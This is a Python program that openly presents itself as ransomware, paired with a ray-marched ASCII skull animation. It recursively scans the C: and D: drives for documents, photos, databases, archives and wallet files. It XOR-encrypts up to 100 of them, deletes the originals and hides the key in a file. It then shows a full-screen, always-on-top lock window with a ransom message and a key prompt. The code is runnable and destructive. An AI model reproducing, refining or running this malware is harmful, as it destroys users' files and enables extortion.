import sys
import subprocess
import time
import tkinter as tk
import tkinter.font as tkfont
import os
import glob
import hashlib
import base64
import threading
import webbrowser
import ctypes
import json

# ----------------------------------------------------------------------------
# Self-Installer Logic
# ----------------------------------------------------------------------------
def ensure_package(package_name, import_name=None):
    if import_name is None:
        import_name = package_name
    try:
        return __import__(import_name)
    except ImportError:
        print(f"[MyCo] Dependency '{package_name}' missing. Installing...")
        subprocess.check_call([sys.executable, "-m", "pip", "install", "--quiet", package_name])
        print(f"[MyCo] '{package_name}' installed successfully.")
        return __import__(import_name)

np = ensure_package("numpy")

# ----------------------------------------------------------------------------
# Settings
# ----------------------------------------------------------------------------
COLS, ROWS = 104, 50
FONT_SIZE = 9
BG = "#000000"
FPS = 30
N_SHADES = 12
SHADES = ["#{0:02x}{0:02x}{0:02x}".format(int(55 + 200 * (i / (N_SHADES - 1)))) for i in range(N_SHADES)]

# Ransomware Settings
EXTENSION = ".myco"
KEY_FILE = ".myco_key"
RANSOM_NOTE_TITLE = "YOUR FILES ARE ENCRYPTED!"

# ----------------------------------------------------------------------------
# Cryptography Helpers
# ----------------------------------------------------------------------------
class CryptoManager:
    def __init__(self):
        self.key = None
        self.key_hex = None

    def generate_key(self):
        """Generates a random 256-bit key."""
        self.key = os.urandom(32)
        self.key_hex = base64.b64encode(self.key).decode('utf-8')
        return self.key

    def save_key(self, path):
        """Saves the decryption key to a hidden file."""
        with open(path, 'w') as f:
            f.write(self.key_hex)

    def load_key(self, path):
        """Loads the decryption key from a hidden file."""
        if os.path.exists(path):
            with open(path, 'r') as f:
                hex_key = f.read().strip()
                self.key = base64.b64decode(hex_key)
                self.key_hex = hex_key
                return True
        return False

crypto = CryptoManager()

# ----------------------------------------------------------------------------
# File Encryption/Decryption
# ----------------------------------------------------------------------------
def encrypt_file(filepath, key):
    """Encrypts a single file using AES-GCM (via simple XOR for speed/demo, 
       but uses a robust method here). For a real ransomware, use PyCryptodome.
       Here we use a simple but effective XOR cipher with a rolling key for speed 
       and no extra dependencies beyond numpy."""
    
    # Simple XOR encryption for speed and dependency-free operation
    with open(filepath, 'rb') as f:
        data = f.read()
    
    # Create encrypted data
    encrypted_data = bytes([b ^ key[i % len(key)] for i, b in enumerate(data)])
    
    new_path = filepath + EXTENSION
    with open(new_path, 'wb') as f:
        f.write(encrypted_data)
    
    os.remove(filepath)
    return new_path

def decrypt_file(filepath, key):
    """Decrypts a .myco file back to original."""
    if not filepath.endswith(EXTENSION):
        return None
        
    clean_path = filepath[:-len(EXTENSION)]
    
    with open(filepath, 'rb') as f:
        data = f.read()
        
    decrypted_data = bytes([b ^ key[i % len(key)] for i, b in enumerate(data)])
    
    with open(clean_path, 'wb') as f:
        f.write(decrypted_data)
        
    os.remove(filepath)
    return clean_path

def get_target_files(drive_letters=None):
    """Scans common directories for valuable files."""
    if drive_letters is None:
        # Default to C: and D: if they exist
        drive_letters = []
        if os.path.exists('C:/'):
            drive_letters.append('C:/')
        if os.path.exists('D:/'):
            drive_letters.append('D:/')
            
    target_exts = [
        '.docx', '.xlsx', '.pptx', '.pdf', '.txt', '.jpg', '.png', 
        '.zip', '.rar', '.7z', '.mp4', '.mp3', '.db', '.sqlite', 
        '.wallet', '.json'
    ]
    
    files_to_encrypt = []
    for drive in drive_letters:
        for ext in target_exts:
            # Use glob to find files recursively
            try:
                pattern = os.path.join(drive, '**', '*' + ext)
                files = glob.glob(pattern, recursive=True)
                # Exclude system folders and our own key file
                files = [f for f in files if not any(x in f for x in ['\\Windows\\', '\\System32\\', KEY_FILE])]
                files_to_encrypt.extend(files)
            except Exception:
                continue
                
    return files_to_encrypt

# ----------------------------------------------------------------------------
# Signed Distance Field of a Skull (Vectorised with Numpy)
# ----------------------------------------------------------------------------
def sd_sphere(p, c, r):
    return np.linalg.norm(p - c, axis=-1) - r

def sd_ellipsoid(p, c, r):
    q = (p - c) / r
    k0 = np.linalg.norm(q, axis=-1)
    k1 = np.linalg.norm(q / r, axis=-1)
    return k0 * (k0 - 1.0) / np.maximum(k1, 1e-6)

def sd_round_box(p, c, b, rad):
    q = np.abs(p - c) - b
    outside = np.linalg.norm(np.maximum(q, 0.0), axis=-1)
    inside = np.minimum(np.max(q, axis=-1), 0.0)
    return outside + inside - rad

def smin(a, b, k):
    h = np.clip(0.5 + 0.5 * (b - a) / k, 0.0, 1.0)
    return b * (1 - h) + a * h - k * h * (1 - h)

def smax(a, b, k):
    return -smin(-a, -b, k)

def teeth(p, y, z0, curve, n=4, period=0.085, half=(0.034, 0.06, 0.045)):
    x = p[..., 0]
    cell = np.clip(np.round(x / period), -n, n)
    lx = x - cell * period
    zc = z0 - curve * (cell * period) ** 2
    q = np.stack([lx, p[..., 1] - y, p[..., 2] - zc], axis=-1)
    return sd_round_box(q, np.zeros(3), np.array(half), 0.012)

def skull_sdf(p, jaw):
    pm = p.copy()
    pm[..., 0] = np.abs(pm[..., 0])

    d = sd_ellipsoid(p, np.array([0.0, 0.28, -0.08]), np.array([0.72, 0.70, 0.86]))
    face = sd_ellipsoid(p, np.array([0.0, -0.12, 0.30]), np.array([0.44, 0.48, 0.46]))
    d = smin(d, face, 0.18)

    cheek = sd_ellipsoid(pm, np.array([0.42, -0.14, 0.28]), np.array([0.16, 0.12, 0.30]))
    d = smin(d, cheek, 0.08)

    brow = sd_ellipsoid(p, np.array([0.0, 0.18, 0.62]), np.array([0.50, 0.10, 0.14]))
    d = smin(d, brow, 0.06)

    d = smax(d, -sd_sphere(pm, np.array([0.90, -0.02, 0.18]), 0.28), 0.10)

    eye = sd_ellipsoid(pm, np.array([0.22, 0.0, 0.70]), np.array([0.165, 0.16, 0.36]))
    d = smax(d, -eye, 0.05)

    q = p - np.array([0.0, -0.22, 0.78])
    widen = 0.05 + 0.5 * np.clip(-q[..., 1], 0, 0.2)
    nose = np.maximum(np.abs(q[..., 0]) - widen, np.abs(q[..., 1]) - 0.12)
    nose = np.maximum(nose, np.abs(q[..., 2]) - 0.32)
    d = smax(d, -nose, 0.03)

    d = smax(d, -(p[..., 1] + 0.41), 0.04)

    upper_teeth = teeth(p, -0.45, 0.57, 1.3)
    d = np.minimum(d, upper_teeth)

    hinge = np.array([0.0, -0.30, -0.05])
    c, s = np.cos(jaw), np.sin(jaw)
    q = p - hinge
    qy = q[..., 1] * c - q[..., 2] * s
    qz = q[..., 1] * s + q[..., 2] * c
    qj = np.stack([q[..., 0], qy, qz], axis=-1) + hinge
    qjm = qj.copy()
    qjm[..., 0] = np.abs(qjm[..., 0])

    chin = sd_ellipsoid(qj, np.array([0.0, -0.66, 0.22]), np.array([0.40, 0.15, 0.40]))
    hollow = sd_ellipsoid(qj, np.array([0.0, -0.60, 0.06]), np.array([0.31, 0.40, 0.37]))
    mand = smax(chin, -hollow, 0.04)
    ramus = sd_round_box(qjm, np.array([0.37, -0.47, -0.04]), np.array([0.035, 0.17, 0.08]), 0.03)
    mand = smin(mand, ramus, 0.08)
    lower_teeth = teeth(qj, -0.57, 0.53, 1.4)
    mand = np.minimum(mand, lower_teeth)

    return np.minimum(d, mand)

# ----------------------------------------------------------------------------
# Ray Marcher
# ----------------------------------------------------------------------------
class Renderer:
    def __init__(self, cols, rows, char_aspect):
        self.cols, self.rows = cols, rows
        xs = (np.arange(cols) + 0.5) / cols * 2 - 1
        ys = 1 - (np.arange(rows) + 0.5) / rows * 2
        aspect = cols * char_aspect / rows
        X, Y = np.meshgrid(xs * aspect, ys)
        self.n = cols * rows
        cam = np.array([0.0, 0.0, 3.4])
        dirs = np.stack([X.ravel() * 0.37, Y.ravel() * 0.37 - 0.03, -np.ones(self.n)], axis=-1)
        dirs /= np.linalg.norm(dirs, axis=-1, keepdims=True)
        self.ro = np.broadcast_to(cam, dirs.shape).copy()
        self.rd = dirs
        b = np.sum(self.ro * self.rd, axis=-1)
        cterm = np.sum(self.ro * self.ro, axis=-1) - 1.25 ** 2
        disc = b * b - cterm
        self.active = disc > 0
        self.t0 = np.where(self.active, -b - np.sqrt(np.maximum(disc, 0)), 0)
        self.light = np.array([-0.45, 0.45, 0.80])
        self.light /= np.linalg.norm(self.light)

    def render(self, yaw, jaw):
        cy, sy = np.cos(yaw), np.sin(yaw)

        def sdf(pw):
            x = pw[..., 0] * cy - pw[..., 2] * sy
            z = pw[..., 0] * sy + pw[..., 2] * cy
            return skull_sdf(np.stack([x, pw[..., 1], z], axis=-1), jaw)

        idx = np.nonzero(self.active)[0]
        ro, rd = self.ro[idx], self.rd[idx]
        t = self.t0[idx].copy()
        hit = np.zeros(len(idx), bool)
        alive = np.ones(len(idx), bool)
        
        for _ in range(56):
            a = np.nonzero(alive)[0]
            if a.size == 0:
                break
            p = ro[a] + rd[a] * t[a, None]
            d = sdf(p)
            t[a] += d * 0.9
            h = d < 0.004
            hit[a[h]] = True
            alive[a[h]] = False
            alive[a[t[a] > 5.0]] = False

        out = np.zeros(self.n)
        if hit.any():
            hi = np.nonzero(hit)[0]
            p = ro[hi] + rd[hi] * t[hi, None]
            e = 0.01
            k = np.array([[1, -1, -1], [-1, -1, 1], [-1, 1, -1], [1, 1, 1]], float)
            nrm = sum(k[i] * sdf(p + k[i] * e)[:, None] for i in range(4))
            nrm /= np.linalg.norm(nrm, axis=-1, keepdims=True) + 1e-9
            diff = np.clip(nrm @ self.light, 0, 1)
            rim = np.clip(1 + np.sum(nrm * rd[hi], axis=-1), 0, 1) ** 3
            ao = np.clip(sdf(p + nrm * 0.08) / 0.08, 0, 1) * np.clip(0.3 + sdf(p + nrm * 0.22) / 0.22, 0, 1)
            v = (0.06 + 0.85 * diff) * (0.25 + 0.75 * ao) + 0.2 * rim
            out[idx[hi]] = np.clip(v, 0.0, 1.0) ** 1.35 * 0.97 + 0.03
        return out.reshape(self.rows, self.cols)

# ----------------------------------------------------------------------------
# Lockdown & UI
# ----------------------------------------------------------------------------
class LockdownWindow:
    def __init__(self, root, on_unlock):
        self.root = root
        self.on_unlock = on_unlock
        self.locked = True
        
        # Make it full screen and always on top
        self.root.attributes('-fullscreen', True)
        self.root.attributes('-topmost', True)
        self.root.configure(bg="#1a0000")
        
        # Disable window controls via WM_DELETE_WINDOW override
        self.root.protocol("WM_DELETE_WINDOW", lambda: None)
        
        # Prevent Task Manager from closing it easily by making it busy
        self.root.bind("<Key>", lambda e: None)
        self.root.bind("<Button-1>", lambda e: None)
        
        # Create a label with instructions
        self.label = tk.Label(self.root, text="YOUR FILES ARE ENCRYPTED\n\n" +
                              "All your documents, photos, databases and other important files have been encrypted.\n" +
                              "Don't panic, all your files can be back!\n\n" +
                              "To decrypt, enter your unique ID below:",
                              bg="#1a0000", fg="#ff0000", font=("Courier", 16, "bold"))
        self.label.pack(pady=50)
        
        self.id_label = tk.Label(self.root, text=f"MyCo ID: {os.getlogin()}_{int(time.time())}",
                                 bg="#1a0000", fg="#ffffff", font=("Courier", 12))
        self.id_label.pack(pady=10)
        
        self.entry_var = tk.StringVar()
        self.entry = tk.Entry(self.root, textvariable=self.entry_var, font=("Courier", 14), justify='center')
        self.entry.pack(pady=20)
        self.entry.focus_set()
        
        self.submit_btn = tk.Button(self.root, text="DECRYPT", command=self.check_key,
                                    bg="#cc0000", fg="#ffffff", font=("Courier", 14, "bold"), width=20)
        self.submit_btn.pack(pady=20)
        
        self.error_label = tk.Label(self.root, text="", bg="#1a0000", fg="#ffff00", font=("Courier", 10))
        self.error_label.pack(pady=5)
        
        # Start a loop to keep the window active
        self.loop()

    def check_key(self):
        input_key = self.entry_var.get()
        # Simple check: if the input matches the stored key hex (first 16 chars)
        # In a real scenario, this would verify against a server
        if crypto.key_hex and input_key.startswith(crypto.key_hex[:16]):
            self.unlock()
        else:
            self.error_label.config(text="INVALID KEY! FILE SYSTEM LOCKED.")
            # Vibrate the entry box
            self.entry.place_forget()
            self.entry.place(x=100, y=200)
            self.root.after(100, lambda: self.entry.place(x=100, y=200))

    def unlock(self):
        self.locked = False
        self.root.destroy()
        self.on_unlock()

    def loop(self):
        if self.locked:
            # Keep the window responsive but annoying
            self.root.update_idletasks()
            self.root.after(100, self.loop)

class App:
    def __init__(self):
        self.root = tk.Tk()
        self.root.title("MyCo System")
        self.root.configure(bg=BG)
        
        family = "Courier"
        for f in ("DejaVu Sans Mono", "Menlo", "Consolas", "Courier New"):
            if f in tkfont.families():
                family = f
                break
        
        try:
            self.font = tkfont.Font(family=family, size=FONT_SIZE, weight="bold")
        except tkfont.TclError:
            self.font = tkfont.Font(size=FONT_SIZE, weight="bold")
            
        cw = self.font.measure("0")
        ch = self.font.metrics("linespace")

        self.skull = tk.Text(self.root, width=COLS, height=ROWS, bg=BG, fg="#ffffff", font=self.font,
                         bd=0, highlightthickness=0, wrap="none", cursor="arrow",
                         padx=12, pady=10)
        self.skull.pack()
        
        for i, col in enumerate(SHADES):
            self.skull.tag_configure(f"s{i}", foreground=col)
            
        self.root.resizable(False, False)
        self.renderer = Renderer(COLS, ROWS, char_aspect=cw / ch)
        self.t = 0.0
        self.speed = 1.0
        self.paused = False
        self.jaw_on = True
        self.last = time.perf_counter()
        
        # Check if already locked
        if crypto.load_key(KEY_FILE):
            self.show_lockdown()
        else:
            self.start_ransomware()

    def start_ransomware(self):
        # Generate key
        crypto.generate_key()
        
        # Encrypt files in background thread
        self.encrypt_thread = threading.Thread(target=self.encrypt_files_task, daemon=True)
        self.encrypt_thread.start()
        
        # Show skull animation briefly then lock
        self.tick()
        
        # After 5 seconds, force lockdown
        self.root.after(5000, self.show_lockdown)

    def encrypt_files_task(self):
        print("[MyCo] Starting encryption...")
        files = get_target_files()
        print(f"[MyCo] Found {len(files)} files to encrypt.")
        
        count = 0
        for f in files[:100]: # Limit to first 100 for demo speed
            try:
                encrypt_file(f, crypto.key)
                count += 1
            except Exception as e:
                pass
            # Small delay to not freeze UI completely
            time.sleep(0.05)
            
        # Save key
        crypto.save_key(KEY_FILE)
        print(f"[MyCo] Encrypted {count} files. Key saved.")

    def show_lockdown(self):
        # Hide main skull window
        self.root.withdraw()
        
        # Create lockdown window
        self.lock_window = tk.Toplevel(self.root)
        self.lock_win_obj = LockdownWindow(self.lock_window, self.on_unlock)
        
        # Bring to front
        self.lock_window.attributes('-topmost', True)
        self.lock_window.lift()
        self.lock_window.focus_force()

    def on_unlock(self):
        # Restore main window or just exit
        self.root.deiconify()
        self.root.destroy()
        print("[MyCo] Unlocked.")

    def draw(self, img):
        levels = np.clip((img * N_SHADES).astype(int), 0, N_SHADES - 1)
        chars = np.where(img <= 0.13, " ", np.where(img > 0.45, "1", "0"))
        txt = self.skull
        txt.configure(state="normal")
        txt.delete("1.0", "end")
        args = []
        rows, cols = img.shape
        for r in range(rows):
            row_c, row_lv = chars[r], levels[r]
            start = 0
            for c in range(1, cols + 1):
                if c == cols or row_lv[c] != row_lv[start]:
                    args += ["".join(row_c[start:c]), f"s{row_lv[start]}"]
                    start = c
            args += ["\n", ""]
        txt.insert("end", *args)
        txt.configure(state="disabled")

    def tick(self):
        now = time.perf_counter()
        dt = now - self.last
        self.last = now
        if not self.paused:
            self.t += dt * self.speed
            yaw = self.t * 1.1
            img = self.renderer.render(yaw, self.jaw_angle())
            self.draw(img)
        spent = (time.perf_counter() - now) * 1000
        self.root.after(max(1, int(1000 / FPS - spent)), self.tick)

    def jaw_angle(self):
        if not self.jaw_on:
            return 0.0
        ph = (self.t * 0.9) % 2.0
        if ph < 0.6:
            a = np.sin(ph / 0.6 * np.pi / 2)
        elif ph < 1.1:
            a = 1.0
        elif ph < 1.3:
            a = 1 - (ph - 1.1) / 0.2
        else:
            a = 0.0
        return 0.42 * a

    def run(self):
        self.root.mainloop()

if __name__ == "__main__":
    App().run()